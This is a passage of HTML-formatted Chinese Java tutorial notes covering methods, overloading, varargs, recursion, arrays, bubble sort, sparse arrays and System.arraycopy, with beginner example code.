keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//输出5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210704215153747.png" alt="image-20210704215153747"></p><p><img src="image-20210704220352425.png" alt="image-20210704220352425"></p><p>如果方法有返回值，方法调用通常当作一个值处理</p><p>如果返回空，则用语句调用</p><h3 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h3><ul><li>形参：在程序中定义的参数，相当于占位符</li><li>实参：实际传入的参数</li></ul><h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><p>java可以定义名称相同参数不同的方法，以达到在不同类型中调用的目的</p><p><img src="image-20210705093830578.png" alt="image-20210705093830578"></p><p><img src="image-20210705093914366.png" alt="image-20210705093914366"></p><h3 id="可变传参"><a href="#可变传参" class="headerlink" title="可变传参"></a>可变传参</h3><p>当需要传入很多参数时，直接定义会很繁琐，这时需要用到可变传参</p><p>语句：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">num</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>int...b</code>即为可变传参，可以接收任意的个数的值</p><p>可变传参必须定义在所有形参之后</p><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>递归即自己调用自己</p><p>递归要求两个条件</p><p>递归边界：递归必须有界限，不能一直执行下去</p><p>递归体：递归的语句</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String <span class="token annotation punctuation">@NotNull</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>String x <span class="token operator">:</span> args<span class="token punctuation">)</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                Scanner scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> n <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">fo</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">fo</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span>    <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"错误的输入"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">else</span> <span class="token keyword">return</span> n <span class="token operator">*</span> <span class="token function">fo</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="java数组"><a href="#java数组" class="headerlink" title="java数组"></a>java数组</h2><h3 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h3><pre class="line-numbers language-java"><code class="language-java">String<span class="token punctuation">[</span><span class="token punctuation">]</span> num<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建/声明一个数组num = new String[10];//声明该数组有十个值</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者写一起</p><pre class="line-numbers language-java"><code class="language-java">String<span class="token punctuation">[</span><span class="token punctuation">]</span> num <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果直接赋值，则无需使用new声明</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> num <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数组是一个对象，可以使用引用类型定义</p><p>所有new的都是对象</p><h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Arrays类"><a href="#Arrays类" class="headerlink" title="Arrays类"></a>Arrays类</h3><p>java在java.uitl中提供了对数组的支持，这里简单举例几个常用的方法</p><pre class="line-numbers language-java"><code class="language-java">Arrays<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//打印数组a</span>Arrays<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//对数组a升序排序</span>Arrays<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//将数组中从第2到第3个数填充为0(左闭右开)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="image-20210705211656347.png" alt="image-20210705211656347"></p><p>冒泡排序</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System<span class="token punctuation">.</span>out<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Plex</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">645</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义要排序的数组        </span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token function">num</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//输出新数组    </span>    <span class="token punctuation">}</span>        <span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">num</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//确定排序次数            </span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>length <span class="token operator">-</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//定位排序点                </span>                <span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> b<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//比较，排序                    </span>                    <span class="token comment" spellcheck="true">//大小换位                    </span>                    <span class="token keyword">int</span> juan <span class="token operator">=</span> b<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                        b<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                                        b<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> juan<span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                 <span class="token punctuation">}</span>                <span class="token keyword">return</span> b<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回结果    </span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>稀释数组</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//稀疏数组</span><span class="token keyword">import</span> <span class="token keyword">static</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System<span class="token punctuation">.</span>out<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//主函数</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Xis</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> num <span class="token operator">=</span> <span class="token function">num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//得到原数组</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> xishu <span class="token operator">=</span> <span class="token function">quzhi</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"======================================"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//输出稀疏数组</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">fuhzi</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> xishu<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token function">fuhzi</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> xishu<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">fuhzi</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> xishu<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++++++++++++++++++++++++"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//稀疏数组还原</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> huanyuan <span class="token operator">=</span> <span class="token function">huanyuan</span><span class="token punctuation">(</span>xishu<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ints <span class="token operator">:</span> huanyuan<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j1 <span class="token operator">&lt;</span> huanyuan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> j1<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>ints<span class="token punctuation">[</span>j1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//定义原数组</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">num</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> num <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        num<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        num<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ints <span class="token operator">:</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>ints<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> num<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//得到稀疏数组头</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">quzhi</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">int</span> shu <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">11</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">11</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    shu<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> xishu <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>shu <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        xishu<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        xishu<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>        xishu<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> shu<span class="token punctuation">;</span>        <span class="token keyword">return</span> xishu<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//原数组压缩为稀疏数组</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">fuhzi</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> xishu<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">11</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">11</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    k<span class="token operator">++</span><span class="token punctuation">;</span>                    xishu<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                    xishu<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                    xishu<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> xishu<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//稀疏数组还原</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">huanyuan</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> xishu<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> shu <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>xishu<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>xishu<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> xishu<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            shu<span class="token punctuation">[</span>xishu<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>xishu<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> xishu<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> shu<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果</p><p><img src="image-20210710220703375.png" alt="image-20210710220703375"></p><h4 id="System-arraycopy方法"><a href="#System-arraycopy方法" class="headerlink" title="System.arraycopy方法"></a>System.arraycopy方法</h4><p>方法原型定义为：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">arraycopy</span><span class="token punctuation">(</span>Object src<span class="token punctuation">,</span>  <span class="token keyword">int</span>  srcPos<span class="token punctuation">,</span> Object dest<span class="token punctuation">,</span> <span class="token keyword">int</span> destPos<span class="token punctuation">,</span>  <span class="token keyword">int</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>含义是复制指定源数组<code>src</code>到目标数组<code>dest</code>中。</p><p>复制从<code>src</code>的<code>srcPos</code>索引开始，复制的个数是<code>length</code>，复制到<code>dest</code>的索引从<code>destPos</code>开始。</p><p>下面是一个样例：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span> <span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>array1<span class="token punctuation">.</span>length <span class="token operator">+</span> array2<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>array1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> array3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token 